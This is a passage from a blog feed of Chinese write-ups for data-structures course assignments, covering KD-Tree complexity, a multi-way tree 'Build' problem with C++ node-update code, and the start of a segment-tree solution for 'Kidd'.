$KD-Tree$ 是等价的, 时间复杂度为 $O(n^{1 - 1/d})$. 进行 $m$ 次查询的时间复杂度为 $O(mn^{1 - 1/d})$.</p><p>综上, 算法总时间复杂度为 $O(nlogn + mn^{1 - 1/d})$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>算法空间复杂度主要来自读取并存储数据的过程:</p><p>每个 <code>Node</code> 结构体实例占用的空间为: $5\times 4B = 20B$.</p><p>每个 <code>Tree</code> 结构体实例占用的空间为: $10\times 4B + 20B + 4B = 64B$.</p><p>实际占用的 <code>Node</code>, <code>Tree</code> 结构体数目正比于输入数据的规模, 空间复杂度为 $O(nd)$.</p><p>最坏情况下程序所占用的内存约为: $20B\times 10^5 + 64B\times 4\times 10^5 = 26.3MB \ll 256MB$.</p><p>因此空间复杂度满足要求.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Build</title>
      <link href="/2022/11/21/build/"/>
      <url>/2022/11/21/build/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-1-Build"><a href="#3-1-Build" class="headerlink" title="3-1 Build"></a>3-1 Build</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>采用 <code>node</code> 类存储每个节点对应的信息.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 23</span><span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> parent<span class="token punctuation">;</span>     <span class="token comment">// 父亲编号</span>    <span class="token keyword">int</span> firstchild<span class="token punctuation">;</span> <span class="token comment">// 长子编号</span>    <span class="token keyword">int</span> lastchild<span class="token punctuation">;</span>  <span class="token comment">// 幼子编号</span>    <span class="token keyword">int</span> pred<span class="token punctuation">;</span>       <span class="token comment">// 左兄弟编号</span>    <span class="token keyword">int</span> succ<span class="token punctuation">;</span>       <span class="token comment">// 右兄弟编号</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>       <span class="token comment">// 子树大小</span>    <span class="token keyword">int</span> height<span class="token punctuation">;</span>     <span class="token comment">// 子树高度</span>    <span class="token keyword">int</span> suffix<span class="token punctuation">;</span>     <span class="token comment">// 自身及后缀兄弟结点最大高度</span>    <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">parent</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">firstchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lastchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">succ</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">suffix</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">height</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">*</span>tree<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根节点编号为 <code>1</code>, 所有节点信息默认初始化为 <code>0</code>, 表示相应信息不存在. 其中 <code>suffix</code> 维护了节点本身及其靠后兄弟 <code>height</code> 的最大值, 在每次进行子树移动时, 只需要向前向上维护 <code>size</code>, <code>suffix</code> 并且更新 <code>height</code> 即可, 如此操作可将时间消耗控制在 <code>cost</code> 内.</p><h4 id="void-Init"><a href="#void-Init" class="headerlink" title="void Init()"></a>void Init()</h4><p>首先调用 <code>Init(n)</code> 对多叉树的 <code>parent</code>, <code>firstchild</code>, <code>lastchild</code>, <code>pred</code>, <code>succ</code> 进行初始化.</p><h4 id="void-InitTree"><a href="#void-InitTree" class="headerlink" title="void InitTree()"></a>void InitTree()</h4><p>随后 <code>Init(n)</code> 调用 <code>InitTree(1)</code>, 借助辅助栈 <code>stack</code> 使用后序遍历的迭代情形对多叉树的 <code>size</code>, <code>height</code>, <code>suffix</code> 进行初始化. 类似二叉树的后续遍历, 对于一个节点, 我们首先初始化其 <code>lastchild</code> 直到 <code>firstchild</code>, 最后初始化其本身.</p><h4 id="void-InitNode"><a href="#void-InitNode" class="headerlink" title="void InitNode()"></a>void InitNode()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 36</span><span class="token keyword">void</span> <span class="token function">InitNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 叶节点.</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">// 子树根节点.</span>        <span class="token keyword">int</span> child <span class="token operator">=</span> tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>lastchild<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>child<span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">+=</span> tree<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">.</span>size<span class="token punctuation">;</span>            child <span class="token operator">=</span> tree<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于叶子节点, 将其 <code>size</code> 设置为 <code>1</code>, <code>height</code> 设置为 <code>0</code>, <code>suffix</code> 设置为其右兄的 <code>suffix</code> (若右兄不存在, 即编号为 <code>0</code>, 那么会返回 tree[0].suffix, 即 <code>0</code>).</p><p>对于一个子树根节点, 将其 <code>size</code> 设置为其子节点的 <code>size</code> 和加 <code>1</code>, <code>height</code> 设置为长子节点的 <code>suffix</code> 加 <code>1</code>, <code>suffix</code> 设置为其自身高度与右兄 <code>suffix</code> 的最大值 (若右兄不存在, 即编号为 <code>0</code>, 那么会返回 tree[0].suffix, 即 <code>0</code>).</p><h4 id="int-Readnode"><a href="#int-Readnode" class="headerlink" title="int Readnode()"></a>int Readnode()</h4><p><code>Readnode()</code> 读入一条路径, 并返回这条路径上的最后一个合法节点编号, <code>real_node</code> 表示当前已读入路径对应的合法节点, <code>tmp_node</code> 表示读入下一个座位后节点的状态, 若为 <code>0</code>, 说明已经进入了无效路径, 直接将之后路径截断即可 (即只读入数据而不对 <code>real_node</code> 进行更新).</p><h4 id="void-Update"><a href="#void-Update" class="headerlink" title="void Update()"></a>void Update()</h4><p>对于每次删除和插入子树, 要在操作位置进行 <code>size</code>, <code>height</code>, <code>suffix</code> 的更新. 其中 <code>height</code>, <code>suffix</code> 的更新比较一致, 将其写作接口 <code>Update()</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 102</span><span class="token keyword">void</span> <span class="token function">Update</span><span class="token punctuation">(</span><span class="token keyword">int</span> tmp<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 更新 suffix.</span>        tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">)</span> <span class="token punctuation">{</span>            tmp <span class="token operator">=</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// 更新 height.</span>        tmp <span class="token operator">=</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>suffix</code> 存储的是节点本身及其后缀兄弟节点的最大 <code>height</code>, 因此对于修改过的节点, 只需要顺次更新其前缀兄弟的 <code>suffix</code>, 当自身已是长子节点时, 更新其父亲的 <code>height</code> 与 <code>suffix</code>, 并以其父亲节点为基准继续更新前缀节点.</p><h4 id="void-Remove"><a href="#void-Remove" class="headerlink" title="void Remove()"></a>void Remove()</h4><p>对于要删去的节点 <code>remove_node</code>, 首先特判其左右兄弟的存在性, 若都存在则将其左兄弟的右兄设置为其右兄弟, 其右兄弟的左兄设置为其左兄弟. 否则 <code>remove_node</code> 必然是其父节点的长子节点或幼子节点, 只需相应进行更新. 最后将 <code>remove_node</code> 的左右兄弟及父亲置为 <code>0</code> 即可.</p><p>随后对全树进行更新. 更新 <code>size</code> 只需沿着 <code>remove_node</code> 的父节点向上, 逐次减去 <code>tree[remove_node].size</code> 即可. 接着更新 <code>height</code> 与 <code>suffix</code>, 若 <code>remove_node</code> 的左兄存在, 直接对其进行 <code>Update()</code> 即可; 否则转到 <code>tree[remove_node].parent</code>, 更新其 <code>height</code>, 并进行 <code>Update()</code>.</p><h4 id="void-Insert"><a href="#void-Insert" class="headerlink" title="void Insert()"></a>void Insert()</h4><p>对于插入的父节点 <code>attach_node</code>, 源子树节点 <code>insert_node</code>, 插入位置 <code>rank</code>, 首先设置 <code>insert_node</code> 父亲为 <code>attach_node</code>. 若父节点无子节点, 则设置 <code>firstchild</code>, <code>lastchild</code> 均为 <code>insert_node</code>. 否则特判插入位置是否为 <code>firstchild</code> 或 <code>lastchild</code> 节点, 并相应进行更新, 原理同 <code>Remove()</code>.</p><p>随后对全树进行更新. 更新 <code>size</code> 只需沿着 <code>insert_node</code> 的父节点向上, 逐次加上 <code>tree[insert_node].size</code> 即可. 接着更新 <code>height</code> 与 <code>suffix</code>, 直接从 <code>insert_node</code> 开始进行 <code>Update()</code>.</p><h4 id="void-Input"><a href="#void-Input" class="headerlink" title="void Input()"></a>void Input()</h4><p>直接读取操作序列并进行操作即可.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>由于数据规模 <code>N</code> 为 <code>1, 1e6</code>, 在初始化时若采用后序遍历的递归版本, 会导致爆栈 (事实上, 我自行构造了一条单链的特殊情况, 在这种情况下, 程序不会正常返回), 因此采用了后序遍历的迭代版本.</li><li>初始化叶节点时, 原本进行了 <code>tree[x].suffix = 0</code>, 事实上需要修改为 <code>tree[x].suffix = tree[tree[x].succ].suffix</code>, 因为叶节点右边的兄弟的高度未必为 <code>0</code>.</li><li>在 <code>Remove()</code> 中更新父节点的高度时, 需要特判父节点是否无子节点.</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 143</span>tmp <span class="token operator">=</span> parent<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">else</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在进行子树移动操作时, 需要在读入 <code>remove_node</code> 后立刻进行 <code>Remove()</code> 操作, 随后进行读入 <code>attach_node</code> 并进行 <code>Insert()</code> 操作. 否则若读入 <code>remove_node</code> 后紧接读入 <code>attach_node</code>, 会导致没有更新删除节点而产生读入错误, 导致进入死循环, 产生 <code>TLE</code> 错误.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><code>InitTree()</code> 过程仅仅与全树节点数目有关系, 每一个节点入栈、出栈、初始化各一次, 时间复杂度为 $O(n)$;</p><p><code>Remove()</code> 与 <code>Insert()</code> 过程中, 在寻找相应节点的时间复杂度为 $O(cost)$, 更新 <code>size</code> 只与树深有关, 更新 <code>height</code> 和 <code>suffix</code> d等价于反向的查找过程, 时间复杂度为 $O(cost)$;</p><p>子树查询仅消耗访问内存常数时间, 时间复杂度为 $O(m)$.</p><p>综上, 算法总时间复杂度为 $O(n + cost + m)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>算法空间复杂度主要来自读取并存储数据的过程:</p><p>每个 <code>node</code> 类对象都存储了常数个成员, 消耗常数空间, 总体空间消耗为 $O(n)$.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 23</span><span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> parent<span class="token punctuation">;</span>    <span class="token keyword">int</span> firstchild<span class="token punctuation">;</span>    <span class="token keyword">int</span> lastchild<span class="token punctuation">;</span>    <span class="token keyword">int</span> pred<span class="token punctuation">;</span>    <span class="token keyword">int</span> succ<span class="token punctuation">;</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">int</span> suffix<span class="token punctuation">;</span>    <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">parent</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">firstchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lastchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">succ</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">suffix</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">height</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">*</span>tree<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 192</span>tree <span class="token operator">=</span> <span class="token keyword">new</span> node<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kidd</title>
      <link href="/2022/11/18/kidd/"/>
      <url>/2022/11/18/kidd/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-4-2-Kidd"><a href="#3-4-2-Kidd" class="headerlink" title="3-4-2 Kidd"></a>3-4-2 Kidd</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题需使用 <code>Segment Tree</code> 数据结构, 为此我们使用 <code>tree[]</code> 记录一条线段的权值之和, 使用 <code>label[]</code> 进行懒惰标记.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 5</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 9</span>ll tree<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 使用 tree[] 来模拟一棵线段树.</span>ll label<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 懒惰标记.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出的卡牌数为 $n\in[1, 2^{31})$, 显然不可能以此作为叶节点规模建立一棵线段树; 由于给出的卡牌操作序列数为 $m\in[1, 200000]$, 其包含的端点数最多为 $400000$, 我们将这些端点排序、去重之后, 得到新的 $k$ 个端点, 记录在 <code>arr[]</code> 中, 并对这 $k$ 个端点和它们分出来的 $k - 1$ 个区间这个假想的扩充数组建立线段树.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 5</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 11</span>ll arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 对离散化的线段端点序列进行排序与去重.</span>ll operations<span class="token punctuation">[</span>MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录操作序列.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体而言, 若去重排序后留下的端点为 $\{0, 2, 6, 10, 11\}$, 那么我们只需对 $\{[0, 0], [1, 1], [2, 2], [3, 5], [6, 6], [7, 9], [10, 10], [11, 10], [11, 11]\}$ 建立线段树. 同时我们为每个区间 $[a, b]$ 定义长度 $real_length(a, b) = b - a + 1$, 注意到这里出现的不合理区间 $[11, 10]$ 的长度被定义为 $0$, 一定程度上便于我们进行理解 (这相当于一个空区间).</p><h4 id="读入数据"><a href="#读入数据" class="headerlink" title="读入数据"></a>读入数据</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 94</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> type <span class="token operator">&gt;&gt;</span> x <span class="token operator">&gt;&gt;</span> y<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token char">'H'</span><span class="token punctuation">)</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读入数据时, 记录下每次操作的具体内容, 并将操作序列的端点记录在 <code>arr[]</code> 中.</p><h4 id="重排序与建树"><a href="#重排序与建树" class="headerlink" title="重排序与建树"></a>重排序与建树</h4><p>使用 <code>&lt;stdlib.h&gt;</code> 中的 <code>qsort()</code> 函数对读入的 <code>arr[]</code> 序列进行排序;</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 22</span>ll <span class="token function">uniquify_array</span> <span class="token punctuation">(</span>ll<span class="token operator">*</span> arr<span class="token punctuation">,</span> ll length<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">++</span>r <span class="token operator">&lt;</span> length<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">!=</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token operator">++</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>    length <span class="token operator">=</span> <span class="token operator">++</span>l<span class="token punctuation">;</span>    <span class="token keyword">return</span> length<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>uniquify_array()</code> 对有序序列 <code>arr[]</code> 进行去重, 参考了课件 <code>02-D1</code> 部分的算法.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 107</span>maxcnt <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>maxcnt</code> 即为线段树的规模大小, 无需进行初始化.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 109</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> right <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token 